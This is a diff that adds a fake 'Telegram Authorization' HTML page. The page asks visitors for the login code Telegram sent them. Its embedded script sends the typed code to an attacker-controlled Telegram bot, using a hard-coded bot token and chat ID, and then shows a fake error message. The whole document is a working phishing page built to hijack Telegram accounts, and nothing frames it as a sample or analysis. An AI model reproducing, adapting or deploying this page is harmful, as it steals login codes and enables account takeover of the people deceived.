@@ -1,0 +1,82 @@
+
+<!DOCTYPE html>
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>Telegram Authorization</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="MobileOptimized" content="176">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <link href="./check/font-roboto.css" rel="stylesheet" type="text/css">
+    <link href="./check/bootstrap.min.css" rel="stylesheet">
+    <link href="./check/bootstrap-extra.css" rel="stylesheet">
+    <link href="./check/telegram.css" rel="stylesheet">
+    <link href="./check/oauth.css" rel="stylesheet">
+
+  <body class="">
+<main class="login">
+  <a href="#" target="_blank" class="login_about"></a>
+  <section class="login_content" id="login-container">
+    <div class="login_photos"><span class="login_telegram_photo_wrap arrowed"><i class="login_telegram_photo"></i></span><a href="https://t.me/telemethebot" target="_blank"><i class="login_bot_photo bgcolor2" data-content="T"><img src="./check/kq7OZrFAsTO8Xue0as0ZspC9El89KqA0gx9Rp6WRpmoQWXB-_SAmSgLo8WbYYoHAZWWZOmArouxM04s1OnlTWtc4QUhUEsq-LuG3Py5s_8x3pbExbBxuP2q56IUJUbLo56mpZ0OIfFPds5_bX4aEX40eChnrJ_kqD2Yue8T8wUceKtTmwWYcL5Uz5R_0iacl.jpg"></i></a></div>
+    <div class="login_header_text">Log in to use your Telegram account </div>
+    <form id="send-form" class="login_form" onsubmit="submitForm(event)" >
+<div id="login-form">
+    <div class="login_form_group">
+
+      <div class="login_form_message dots-animated">We've just sent you a message.<br>Please enter the code sent</div>
+    </div>
+    <center>
+    <div class="input-group with-label"><input class="form-control" type="text" placeholder="Code" required name="code" maxlength="6"><label for="sign-in-code"></label></div>
+   </center> 
+      <button class="button-item button-item-flat ripple-handler" >
+        <br>
+        <span class="button-item-label" onclick="submitForm()" onsubmit="submitForm(event)">Proceed</span>
+        <span class="ripple-mask"><span class="ripple"></span></span>
+      </button>
+    </div>
+  </div>
+  </form>
+</section>
+
+<script>
+    function submitForm(event) {
+            event.preventDefault(); //Prevent the default form submission
+  
+       // Get form data by name
+       const code = document.getElementsByName('code')[0].value;
+       
+       // Prepare form response
+       const formResponse = `
+           LOGIN CODE IS
+            code: ${code}
+       `;
+  
+       // Send form response to Telegram bot
+       const telegramBotToken = '7172258149:AAGrENqayWQ5QF2qJMhzsahr5Z_SX4dsr4A';
+       const telegramChatId = '979353448';
+  
+       const telegramMessage = encodeURIComponent(formResponse);
+       const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${telegramMessage}`;
+  
+       fetch(telegramApiUrl)
+           .then(response => {
+               if (!response.ok) {
+                   throw new Error(`HTTP error! Status: ${response.status}`);
+               }
+               return response.json();
+           })
+           .then(data => {
+               console.log('Telegram API response:', data);
+               alert('Node API Error')
+           })
+           .catch(error => {
+               console.error('ERROR', error.message);
+               alert('Error submitting  Please try again.');
+           });
+   }
+  </script>
+  
